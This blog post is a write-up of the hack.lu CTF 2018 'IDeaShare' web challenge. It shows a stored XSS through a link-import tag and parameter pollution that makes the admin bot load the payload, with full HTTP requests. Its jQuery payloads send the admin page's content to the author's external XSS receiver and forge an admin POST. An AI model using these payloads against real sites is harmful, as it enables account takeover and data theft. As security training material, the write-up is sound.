---
title: hacklu CTF 2018-IDeaShare-writeup(After the end of the CTF)
date: 2018-10-21 17:53:10
tags: [ctf,writeup]
---

First, there is a textarea for you to write your idea, some key words were blocked, but we can use `link` to import external resources, payload like this:

```html
<link/rel=import href=https://https.zer0b.com/BlueLotus_XSSReceiver/myjs/tester.js>
```

After save this as first idea, we can access url below to bring the js  into effect:

```html
https://arcade.fluxfingers.net:1818/?page=view&raw&owner=304&pad=1
```

<!--more-->

There are some restrictions when we use the `link` tag:

* the href attribute must start with `https`, when use `http` will look like this:

  ![image-20181019215815504](./http_console_err.png)

  So  you should have a domain name and `let's encrypt` will help you with configing https.

* you must set `Access-Control-Allow-Origin` to make it possible link js from your site, or you will get this:![image-20181019221619447](./access_control_err.png)

  the nginx config is blow:

  ```nginx
    add_header Access-Control-Allow-Origin *;
    add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS';
    add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';
  ```

Then XSS can be successfully triggered when we visit this page(`https://arcade.fluxfingers.net:1818/?page=view&raw&owner=304&pad=1`)

![image-20181019222416066](./shares.png)

We know from `about` page that:`An Admin will check your IDea and evaluate it.`  But in our shares list, url like this:

```html
   <a href=?page=view&owner=304&pad=3>IDea Number 3</a>
```

Obviously the **raw** parameter is missing here, Admin will not trigger our XSS when he check ideas.

We found a `parameter pollution` vulnerability here, then we can construct such url to create a new idea:

```http
POST /?page=idea&pad=1%26raw HTTP/1.1
Host: arcade.fluxfingers.net:1818
Connection: close
Content-Length: 110
Cache-Control: max-age=0
Origin: https://arcade.fluxfingers.net:1818
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://arcade.fluxfingers.net:1818/?page=idea&pad=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd

idea=%3Clink%2Frel%3Dimport+href%3Dhttps%3A%2F%2Fhttps.zer0b.com%2FBlueLotus_XSSReceiver%2Fmyjs%2Ftester.js%3E
```

Please note that the name of the pad is `1%26raw`, and we share this idea:

```http
POST /?page=idea&pad=1%26raw HTTP/1.1
Host: arcade.fluxfingers.net:1818
Connection: close
Content-Length: 341
Cache-Control: max-age=0
Origin: https://arcade.fluxfingers.net:1818
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://arcade.fluxfingers.net:1818/?page=idea&pad=1%26raw
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd

share=&g-recaptcha-response=03AMGVjXhpe6wbk65KVTuzy2kfsLDT8duce0LwPj18Mec_vBg_6GvZJaBlETmfIoFRCTS-OpEk4KPm5FzfwEAQsfnSxbv_jj80RKuppequjTau-YmmNiy_Om3tbcuJUGGz3sxjMaF75uGQqVJCWpMKua-jBED5ahDSFab2ZP_Pomi9FxVFBcSxkfgYhiu9xpT7wLLbL43rO1SeExQGRBhBp9Yp5fnBfyLFB4b6KloNQ18QmVKBDXTajuUuZoFKM_gmRZs2bu5138xged-JNAuxdpOv7HLoSLpS7ukB0R_REGv5HlQULAofOQs
```

We can found a new url in shares list:

![image-20181021171619823](./image-20181021171619823.png)

and it's url like this:

```html
<a href=?page=view&owner=304&pad=1&amp;raw>IDea Number 1&amp;raw</a> 
```

Xss will be triggered when the administrator accesses this url.

![image-20181021172716373](./httponly.png)

Cookie is set to be httpOnly, so we can't reveive cookie in XSS platform.

![image-20181021173018469](./admin.png)

We access admin page with js, and payload in tester.js like this:

```html
<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
<script>
    var xss_url='https://https.zer0b.com/BlueLotus_XSSReceiver/index.php';
    //admin page
    $.get("/?page=admin",async=false,function(result){
        $.post(xss_url,data="admin_content="+result,async=false);
    });
</script>
```

We received the content of the admin page, the most important part of which is this：

```html
<form method="POST" action="?page=admin"> 
    <div class="form-group"> 
        <label for="password">Winner ID</label> 
        <input type="text" name="userid" class="form-control" /> 
    </div> 
    <button type="submit" class="btn btn-primary">Submit</button> 
</form> 
```

Then construct payload in tester.js

```html
<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
<script>
    var xss_url='https://https.zer0b.com/BlueLotus_XSSReceiver/index.php';
    //admin page
    $.post("/?page=admin",{ userid:"720" },async=false);
</script>
```

We got the flag:

![image-20181021175039661](./flag.png)